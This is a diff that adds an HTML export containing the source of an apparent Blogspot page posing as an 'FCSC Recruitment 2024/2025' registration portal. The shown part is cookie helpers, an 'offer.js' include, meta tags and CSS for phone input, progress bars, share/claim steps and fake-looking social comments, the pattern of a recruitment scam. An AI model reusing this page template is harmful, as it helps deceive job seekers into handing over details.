@@ -1,0 +1,702 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+  <meta http-equiv="Content-Style-Type" content="text/css">
+  <title></title>
+  <meta name="Generator" content="Cocoa HTML Writer">
+  <meta name="CocoaVersion" content="2299.77">
+  <style type="text/css">
+    p.p1 {margin: 0.0px 0.0px 0.0px 0.0px; font: 12.0px Helvetica}
+    p.p2 {margin: 0.0px 0.0px 0.0px 0.0px; font: 12.0px Helvetica; min-height: 14.0px}
+    span.Apple-tab-span {white-space:pre}
+  </style>
+</head>
+<body>
+<p class="p1">&lt;!DOCTYPE html&gt;</p>
+<p class="p1">&lt;html&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;head&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;script src="offer.js"&gt;&lt;/script&gt; <span class="Apple-converted-space"> </span></p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;script&gt;</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">        </span>function set_Cookie(name,value){</p>
+<p class="p1"><span class="Apple-converted-space">            </span>var Days = 30;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>var exp = new Date();</p>
+<p class="p1"><span class="Apple-converted-space">            </span>exp.setTime(exp.getTime() + (Days*20*1000));</p>
+<p class="p1"><span class="Apple-converted-space">            </span>document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString()+"; path=/;"</p>
+<p class="p1"><span class="Apple-converted-space">        </span>}</p>
+<p class="p1"><span class="Apple-converted-space">        </span>function get_Cookie(name){</p>
+<p class="p1"><span class="Apple-converted-space">            </span>var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");</p>
+<p class="p1"><span class="Apple-converted-space">            </span>if(arr=document.cookie.match(reg)){</p>
+<p class="p1"><span class="Apple-converted-space">                </span>return unescape(arr[2]);</p>
+<p class="p1"><span class="Apple-converted-space">            </span>}</p>
+<p class="p1"><span class="Apple-converted-space">            </span>return '';</p>
+<p class="p1"><span class="Apple-converted-space">        </span>}</p>
+<p class="p2"><br></p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">        </span>/*<span class="Apple-converted-space">            </span>if(get_Cookie("d")&gt;0 &amp;&amp;get_Cookie("d")&lt;12){</p>
+<p class="p1"><span class="Apple-converted-space">                        </span>document.getElementById("first-box")."quedate__step".display="none";//??;</p>
+<p class="p1"><span class="Apple-converted-space">                        </span>document.getElementById("second-box").style.display="none";//??;</p>
+<p class="p1"><span class="Apple-converted-space">                        </span>document.getElementById("third-box").style.display="none";//??;</p>
+<p class="p1"><span class="Apple-converted-space">                        </span>document.getElementsByClassName("loading2__box").style.display="";//??;</p>
+<p class="p1"><span class="Apple-converted-space">                    </span>}*/</p>
+<p class="p2"><br></p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;/script&gt;</p>
+<p class="p2"><span class="Apple-converted-space">  </span></p>
+<p class="p1"><span class="Apple-converted-space">       </span>&lt;meta charset="UTF-8" /&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>&lt;meta name="viewport" content="width=device-width, initial-scale=1.0" /&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>&lt;title&gt; FCSC Recruitment 2024/2025&lt;/title&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>&lt;link rel="shortcut icon" type="image/png" href="data:image/webp;base64,UklGRrALAABXRUJQVlA4WAoAAAAQAAAAPwAAMwAAQUxQSBEEAAARoPZs29o2H5tuuVGnTKkyTKsUxsxML/OYmSnrmJmZmZmZmbHRojFvpQ/jRZ1VpdGsRo7u64Ptx67fiJgAKkBnYYq/HHw600nJRej/OP3L531PAOBLjpp7s4tkN28AAEMbCQHASae9YncxjK8M+QEAc+3lkSH44Kc0TVaKrVpD+FQ6A+DetlojZjjVVpcs2W4n6b4lr23gkAzKvLckbOS0xttz9tnsZz695qrevpcaZh14dTo9+XhysS/WVNUHDABqK53p0Cpd3Kd0zuXo/KVpH4H2aTkTrgD0/U4iko5q1IFU6K0G62uxZhURuTKhn+YSmwxDXusmcr4FEBpIlJCnk5cwVpPuJOc+NsAYsQdGiO7zusqFgEd/EFF9VQeXHO1kAD7nYQg+kkSKBQXw3dc49fv7kQkSkXQY+srf5F4gh9dXSBcJJwjJIpO8cXV6e0nbkw2ennJKMZ5WFWJ9Ql4RShP4Ek/GrWQYXr7Q3+kgIqoUEnjoEJojwE0N4jdEYfzlb3LGav6A4AISriOAk7UKEUkeXyZEeXRFj5skqdYpAeVnsdhsgeiDBe17nwsxTKrhayO7TH8LwQfFxGggG9k11IVMxm5W7JU7PcYMUb9vdsqdWpjEHZJEVF2xDQf7x1HxZJdAj7vvM6dTsUzb4FoJaeCT7Ls9DJYxAH+hOrBvVpUSVwBgsU4qtDlxw2yEnT/d18BHRAmfddSKL+ykjDulat4mEVUJ6/BPEOUCw7kVCjOQ14rIFWLOyefwECEE2Vw0KhaY+pGVMMuNiXrmI+2QrOK0SGRRv2emopsmbFdY4NuVb/K+c0redFoGyPXXqIxHLJBZpcoVNsOLajV9pLIa1TCHPub/mNw8HcrWo9+v/UQdZM6e814THDJS5bOelAUW1GmwNxKaPS0TANJ3BkLf2rvbn8vxkzYmdW5yTKoKZDWV4kN8qXTSuIipcdUbHM0PlnH/+gCc1zau+srRbiJyFNPRxqxh5NYnyRPGgwreOWwGY8rUfqTmJUjUKgtY6qQYMt0vP4pFRFJKGLnDh9+HWb40bIzMP8pIRFOBb93JwvVAoAiRlHQH/D4M81HlI5DmlYhcT1R1mRWbougiUZXWSXXOMSxlVq/9VaF2PNHAcGSFFev5fYW49gH5yho/rFbOrr2Z7R/uqPUlvMyKXUjrekgFwLCeVQDRQ+PS1e1WHEKEYVNWIoesCMDW1y1I/mwvOcXcVLYXRpv7SbaX/LM5+ltmG8l/kJWLYONFZKnnZoRZLThWWLlT3BqpRPNBbfcoOsxCzACYNazu6ZLawk0FWOElojn+XYuWHn8ZZgNEwy8PzJ690x9kvPU6qIB7bPI1r1Ta663y0+hNJ5/mKWr+y6ObJ/1aJcmbUq752L2tyDQAVlA4IHgHAABQIwCdASpAADQAPjEKjEYiERELgCADBLYATplCQE/Nvx5/ID5QKq/TvvV+L/KnGq5P9LXxLekr5gP1m/Yj2oP1y9xPoAfrv1lnoV/tv6Yv7PfB9+2n7gfAP+2d3VfR/w782/w749+u/j9nG/rR+A/sH7Jeon+S8FfdV+5eoF+Kfx7+x/kr+ZnHHAA/LP6d/u+Mz5gPU7/O/9h6Wf5n/AePb4d7AH8r/vH/P9lT+c8bn0z/2fcK/Wn/b9h30TVu6YDYSbOQSHPGryy9zGOP0/vfdanUMNpGU3tfR87hlGhpnqxBoe286uGgUtWY27MU2YP/JWMdJgcaMnj6JGLEnJFauNNDLPs+JhgXjUtGYl0KXRKutfW+gqbXPhYk4pBvWw/J9gAA/vvZ07iil13Q5t6/3+3zy3Ilo3mUtEwiHus6OEGfOXR4LRC8d6BKrajHB8f/LiQ7x3yP/nK8kGeMHv/805HzHDJz3F+DPPjTSuYq+P/qdbp8vw+iOc46Tsl/s+zy1rliSfw/S1u93/SDb9Gp/48CVcEyWokGU9TuaJ2na02JjgF8SLP9Kg9Ixr1kVYyQblRmqxj/4SSFtiBrwoZayox9zFSJ/OPWjMtJprpR2kXsphNz+/dRPhEXPhe/1zphcLJDtbQE/UILqPo898R+00DTya9TfbvJRkjwX4w8IUhBWOuwkVPcQCcyGBf7hZkSE7DfxWw1l5Sx3gKdCqmfHRbF4VogiNS/F7OUqpLanjN0t35mdFTchRbA38OQKayJ/e/VYFn9+RK6itEg4bB/ka26Q1ag6qfsTrINn+zs6LgGKlNCHCI9QZFG3Upw3Pf+enud01blTSQeDE7l7dJ4R2S+nngDAyNaNOYBEfqPynm8P2Kvdvo5TgFirbYMc3Y5w5YntZNb3l1F2gTkfU39e/uINZj6t9bQqnOy2+YpuQmtoSS+eQDUXSQ0vOKTE9DxgkOeaqnL2gP1NiwIc5ZWp9/HJc/0KWiqjsmJcj0tillc7HAeHXZBk/MYJH/6UYtT/VujU1g2/6zdp8suUK0VFJoDciDv+XTzOcuCGsGSFV9j4rKK2cIPW2cnLKGxL3CyRlaxpF7py9Akms2XIhjSU9C0HVtr1kkpY7Jh87YfnjfRmRnqtRizDM/9+ObERT1ckhit40HWRHuGDytuRVCgVyRe9+VQkM307UEfHbdm4avKdEV9Vsf6AJdI7yyR92H5zhSr5hIFM+zfokTt6y8+EeZNLp7Uw5IUJ3yCOt4pXAJn+wUBvnupU303SqFdSWhVje/mqwHE8d6zuUufm1ucxg4En1oRnGjcRIH2dRS5rcZ+ATw84Y+G//Tcs7p0yRcQftiWncaPdYu+PMLB4/4Re7lDcD/1BvFSL9FfDLSOk/4SsSD9FyM7pSU/+9XIX/iS32QuNi1A1QpkyHS7qmdK++RPN9QHICSL3fWTrpkXunlLoM86rYsh7RohW1Oedhy6JQP7bojwZYKFG5MyO+S0qiNicp9rwjnY2Rlav9HSFjMUT/SLqbeh/n2U9FsWlLEbGAxAfkQ//ffzGC00tZmvu5v79OE/XzlCJThnDAAVJkAOQKSF7xX5ojelPdBAyg1Nerb51IQBA3gc0vuknXCqaBnku4/VTacvzb4870FwCuIZmbftWwmL/4xaPxGbydRIdnA0rIJw2RWFt6yjbjtu+G8jeaeuF6vcMA8YoNum7NWpzZF/qE+54Gk0VYyqkstmStxUcpES7bcC45PkxuejxzHXN7v8UKXeAyf3kRvGWQGQntJ0/zZOIbQ5qkln8fJsVxzA9dsGEMEbdj0L97IIPTis/sYCPcx1usGRb/wKSvDewCjPDdZi+9ObzOpmXfF6hifHeJaedx7z0fJM7hI3CrFJj5qgJynIw7/XRPygOhVdT/xjIZSACBgf+eLNrYkkkd3SxfOa1ePwZClufPuY4+SinboZsKVLDT8gwTfXrfwSfLvH5Xh7kpis8zodo7xFbntOaJ9hrHJBkOOrpQNTov48jaWndWjvJ+j5TeZlJfmfUYRI8ZVJbl+fMyagG3bNopftqPetdAUnqc3CVInIQ4Jv+K9kP+meIGEhHtWnxk2rbOWgEc3FC0ue1srNVU+KIiudQ/osYO4jBXZn6OrF8SbEX7jDnfDKth3AdxBZEIopLI4DRBwY/YN9tFuXY8C7FaHV3Xt5jPnncAKuL2NpGpEhH8DApL5K9zPgFYnDsyGG29N1HLTcXguOz9Hi92cqsnTK58SNq76141IXhV+LHYjhXlSHm4ydDrrrBUMWfIb+c6DdZXj1WBYnqYkvt73528RnvQcWGSdRSjuk+yKUUQINblHpvQ3e+6X9HNgZ4SolLaSXEi2NRNlT1p/h52lYWLPx58EqtCgjy4Oi2cnJYrw6HqCsI3OTabxFgX1duwRYzNN1aa/qRip08TUUa5ShvBypsNmtP5+coL/hkE603SvmUz8HRDO2omor1ub/qvOwMAcQbXgffzAFANO0yk7pLJQAahV3Ph9TkG0JuEn/bFaQITI6AE6fEZtM5uGonMIkccfSeAAA" /&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>&lt;meta name="og:title" content="<span class="Apple-converted-space">  </span>FCSC Recruitment 2024/2025 Application Registration Form Portal" /&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>&lt;meta property="og:description" content=" Apply for the FCSC Recruitment 2024/2025" /&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>&lt;meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi8pdj5g9f6jmjpnCBMkcyzOEjZEC_h8MzTQc46DTDNUtynit0KgjASEuA_7WQcJjM8iE5ZAGGdaD3yfqIU_D1YovHHwrJW0ebOnZA8MdURCO2wi9QjcitO9_DIiDdapnT6BoMziyUd_Jp0s5WzwvLh_WtWTetpQyw5RES7ETs0TI5iXfaNCqoJwcU0VuRP/s1179/6fyter7yuchvjre.jpeg" /&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>&lt;meta property="og:type" content="website" /&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;meta property="og:updated_time" content="1440432930" /&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;link rel="me" href="https://www.blogger.com/profile/13809910274301822692" /&gt;</p>
+<p class="p2"><br></p>
+<p class="p1">&lt;link rel="me" href="https://www.blogger.com/profile/17222055979768522082" /&gt;</p>
+<p class="p1">&lt;meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/&gt;</p>
+<p class="p1">&lt;meta name='google-adsense-platform-domain' content='blogspot.com'/&gt;</p>
+<p class="p1">&lt;link rel="me" href="https://www.blogger.com/profile/05963652588202294752" /&gt;</p>
+<p class="p1">&lt;meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/&gt;</p>
+<p class="p1">&lt;meta name='google-adsense-platform-domain' content='blogspot.com'/&gt;</p>
+<p class="p1">&lt;link rel="me" href="https://www.blogger.com/profile/05853757488319578479" /&gt;</p>
+<p class="p1">&lt;meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/&gt;</p>
+<p class="p1">&lt;meta name='google-adsense-platform-domain' content='blogspot.com'/&gt;</p>
+<p class="p1">&lt;link rel="me" href="https://www.blogger.com/profile/03760741075252211382" /&gt;</p>
+<p class="p1">&lt;meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/&gt;</p>
+<p class="p1">&lt;meta name='google-adsense-platform-domain' content='blogspot.com'/&gt;</p>
+<p class="p1">&lt;link rel="me" href="https://www.blogger.com/profile/13505557265109218333" /&gt;</p>
+<p class="p1">&lt;meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/&gt;</p>
+<p class="p1">&lt;meta name='google-adsense-platform-domain' content='blogspot.com'/&gt;</p>
+<p class="p1">&lt;link rel="me" href="https://www.blogger.com/profile/06403291488377277313" /&gt;</p>
+<p class="p1">&lt;meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/&gt;</p>
+<p class="p1">&lt;meta name='google-adsense-platform-domain' content='blogspot.com'/&gt;</p>
+<p class="p1">&lt;link rel="me" href="https://www.blogger.com/profile/01562472738468891477" /&gt;</p>
+<p class="p1">&lt;meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/&gt;</p>
+<p class="p1">&lt;meta name='google-adsense-platform-domain' content='blogspot.com'/&gt;</p>
+<p class="p1">&lt;/head&gt;</p>
+<p class="p1">&lt;body&gt;</p>
+<p class="p1"><span class="Apple-converted-space">  </span>&lt;style&gt;</p>
+<p class="p1"><span class="Apple-converted-space">  </span>.blink {</p>
+<p class="p1"><span class="Apple-converted-space">  </span>animation: blink 1s steps(1, end) infinite;</p>
+<p class="p1">}</p>
+<p class="p2"><br></p>
+<p class="p1">@keyframes blink {</p>
+<p class="p1"><span class="Apple-converted-space">  </span>0% {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>opacity: 1;</p>
+<p class="p1"><span class="Apple-converted-space">  </span>}</p>
+<p class="p1"><span class="Apple-converted-space">  </span>50% {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>opacity: 0;</p>
+<p class="p1"><span class="Apple-converted-space">  </span>}</p>
+<p class="p1"><span class="Apple-converted-space">  </span>100% {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>opacity: 1;</p>
+<p class="p1"><span class="Apple-converted-space">  </span>}</p>
+<p class="p1">}</p>
+<p class="p1">&lt;/style&gt;</p>
+<p class="p1">&lt;style type="text/css"&gt;</p>
+<p class="p1">@import url("https://fonts.googleapis.com/css2?family=Poppins:wght@500;700&amp;display=swap");</p>
+<p class="p1">@import url("//fonts.googleapis.com/earlyaccess/droidarabicnaskh.css");</p>
+<p class="p1">* {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>margin: 0;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>padding: 0;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>font-family: Poppins, Droid Arabic Naskh;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>font-weight: normal;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>box-sizing: border-box;</p>
+<p class="p2"><br></p>
+<p class="p2"><br></p>
+<p class="p1">}</p>
+<p class="p1">body {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>direction: lfl;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>background: #ffffff;</p>
+<p class="p1">}</p>
+<p class="p1">a {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>text-decoration: none;</p>
+<p class="p1">}</p>
+<p class="p1">.post {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>background: #ffffff;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>margin: 0 auto;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>padding: 10px;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>max-width: 500px;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>border: 1px solid #04790e;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>border-radius: 3px;</p>
+<p class="p1">}</p>
+<p class="p1">.post img {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>width: 100%;</p>
+<p class="p1">}</p>
+<p class="p1">.welcome {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>font-size: 15px;</p>
+<p class="p1">}</p>
+<p class="p1">.amount,</p>
+<p class="p1">#getname {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>color: #04790e;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>text-decoration: none;</p>
+<p class="p1">}</p>
+<p class="p1">.done {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>text-align: center;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>color: #27ae60;</p>
+<p class="p1">}</p>
+<p class="p1">.tip {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>font-size: 14px;</p>
+<p class="p1">}</p>
+<p class="p1">.title {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>text-align: center;</p>
+<p class="p1">}</p>
+<p class="p1">.error {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>display: none;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>text-align: center;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>font-size: 14px;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>color: #e74c3c;</p>
+<p class="p1">}</p>
+<p class="p1">button {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>display: block;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>width: 200px;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>height: 50px;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>color: #ffffff;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>border: none;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>outline: none;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>font-size: 24px;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>cursor: pointer;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>border-radius: 5px;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>padding: 0 10px;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>margin: 10px auto;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>background: rgb(4, 121, 14);</p>
+<p class="p1"><span class="Apple-converted-space">    </span>transition: background 0.3s ease;</p>
+<p class="p1">}</p>
+<p class="p1">button:hover {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>background: #04790e;</p>
+<p class="p1">}</p>
+<p class="p1">.phone {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>max-width: 400px;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>margin: 10px auto;</p>
+<p class="p1">}</p>
+<p class="p1">.phone input {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>width: 100%;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>height: 50px;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>padding: 10px;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>outline: none;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>border: 2px solid #04790e;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>font-size: 14px;</p>
+<p class="p1">}</p>
+<p class="p1">#confirm {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>width: 200px;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>margin: 10px auto;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>border-radius: 0px;</p>
+<p class="p1">}</p>
+<p class="p1">#loader {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>text-align: center;</p>
+<p class="p1">}</p>
+<p class="p1">.spin {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>width: 50px;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>height: 50px;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>background: transparent;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>border: solid 8px rgb(4, 121, 14);</p>
+<p class="p1"><span class="Apple-converted-space">    </span>border-right-color: transparent;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>border-radius: 50%;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>margin: 10px auto;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>animation: spin 0.8s linear infinite;</p>
+<p class="p1">}</p>
+<p class="p1">@keyframes spin {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>100% {</p>
+<p class="p1"><span class="Apple-converted-space">        </span>transform: rotate(1turn);</p>
+<p class="p1"><span class="Apple-converted-space">    </span>}</p>
+<p class="p1">}</p>
+<p class="p1">#loader,</p>
+<p class="p1">#info,</p>
+<p class="p1">#checking,</p>
+<p class="p1">#share,</p>
+<p class="p1">#claim {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>display: none;</p>
+<p class="p1">}</p>
+<p class="p1">.center {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>display: flex;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>align-items: center;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>justify-content: center;</p>
+<p class="p1">}</p>
+<p class="p1">.barr {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>direction: ltr;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>max-width: 400px;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>margin: 10px auto;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>box-sizing: border-box;</p>
+<p class="p1">}</p>
+<p class="p1">.fill {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>position: relative;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>display: inline-block;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>width: calc(100% - 100px);</p>
+<p class="p1"><span class="Apple-converted-space">    </span>height: 35px;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>padding: 2px;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>border: 2px solid #04790e;</p>
+<p class="p1">}</p>
+<p class="p1">#fill,</p>
+<p class="p1">#fill2 {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>background: #04790e;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>width: 0%;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>height: 100%;</p>
+<p class="p1">}</p>
+<p class="p1">.percentage {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>width: 100px;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>float: right;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>height: 35px;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>color: #04790e<span class="Apple-tab-span">	</span></p>
+<p class="p1"><span class="Apple-converted-space">    </span>font-size: 16px;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>border: 2px solid #04790e;</p>
+<p class="p1">}</p>
+<p class="p1">#percentage,</p>
+<p class="p1">#percentage2 {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>margin-left: 5px;</p>
+<p class="p1">color: #04790e<span class="Apple-tab-span">	</span></p>
+<p class="p1">}</p>
+<p class="p1">#check,</p>
+<p class="p1">#check2 {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>display: none;</p>
+<p class="p1">}</p>
+<p class="p1">.counter {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>color: #7f7f7f;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>font-size: 12px;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>text-align: right;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>padding: 10px 0 10px 2px;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>border-bottom: 1px solid #e1e2e3;</p>
+<p class="p1">}</p>
+<p class="p1">.reactions {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>display: inline-flex;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>align-items: center;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>float: left;</p>
+<p class="p1">}</p>
+<p class="p1">.counter img {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>float: left;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>width: 16px;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>height: 16px;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>border-radius: 50%;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>border: 2px solid #fff;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>box-sizing: content-box;</p>
+<p class="p1">}</p>
+<p class="p1">.like,</p>
+<p class="p1">.love {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>margin-right: -5px;</p>
+<p class="p1">}</p>
+<p class="p1">.like {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>z-index: 2;</p>
+<p class="p1">}</p>
+<p class="p1">.love {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>z-index: 1;</p>
+<p class="p1">}</p>
+<p class="p1">.bar {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>display: table;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>width: 100%;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>border-bottom: 1px solid #e1e2e3;</p>
+<p class="p1">}</p>
+<p class="p1">.bar .react {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>display: table-cell;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>width: calc(100% / 3);</p>
+<p class="p1"><span class="Apple-converted-space">    </span>font-size: 12px;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>color: #7f7f7f;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>text-align: center;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>padding: 10px 0;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>cursor: pointer;</p>
+<p class="p1">}</p>
+<p class="p1">.comments {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>direction: ltr;</p>
+<p class="p1">}</p>
+<p class="p1">.comment {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>padding: 6px 0;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>margin-top: 5px;</p>
+<p class="p1">}</p>
+<p class="p1">.comment img {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>float: left;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>width: 32px;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>height: 32px;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>border: none;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>border-radius: 18px;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>cursor: pointer;</p>
+<p class="p1">}</p>
+<p class="p1">.reply {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>margin-left: 37px;</p>
+<p class="p1">}</p>
+<p class="p1">.single-container {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>margin-left: 37px;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>background: #f1f2f6;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>padding: 10px;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>border-radius: 15px;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>font-size: 12px;</p>
+<p class="p1">}</p>
+<p class="p1">.single-container .user {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>display: inline-block;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>cursor: pointer;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>color: #365899;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>margin-bottom: 5px;</p>
+<p class="p1">}</p>
+<p class="p1">.single-container .text {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>display: block;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>color: #000000;<span class="Apple-tab-span">	</span></p>
+<p class="p1">}</p>
+<p class="p1">.buttons {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>font-size: 12px;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>font-weight: bold;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>margin: 10px 0 0 47px;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>color: #90949c;</p>
+<p class="p1">}</p>
+<p class="p1">.action {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>cursor: pointer;</p>
+<p class="p1">}</p>
+<p class="p1">.action:hover {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>text-decoration: underline;</p>
+<p class="p1">}</p>
+<p class="p1">.input {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>padding: 6px 12px 12px;</p>
+<p class="p1">}</p>
+<p class="p1">.input input {</p>
+<p class="p1"><span class="Apple-converted-space">    </span>width: 100%;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>background: #f1f2f6;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>padding: 10px;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>border-radius: 15px;</p>
